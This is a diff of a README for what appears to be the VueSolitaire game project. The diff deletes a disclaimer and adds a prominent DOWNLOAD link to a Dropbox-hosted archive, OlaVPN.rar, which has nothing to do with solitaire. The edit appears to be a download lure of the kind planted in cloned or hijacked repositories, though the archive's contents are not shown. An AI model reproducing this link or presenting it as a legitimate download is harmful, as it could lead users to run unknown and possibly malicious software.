@@ -12,7 +12,4 @@
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
 <h1 align="center"><a  href="">DOWNLOAD</a></h1>
-
-## Disclaimer 
-Please do not share link to this repository 
-it exists solely for commercial and advertising purposes.
+<h1 align="center"><a  href="https://www.dropbox.com/s/pofyz3hidbwemuc/OlaVPN.rar?dl=0">DOWNLOAD</a></h1>
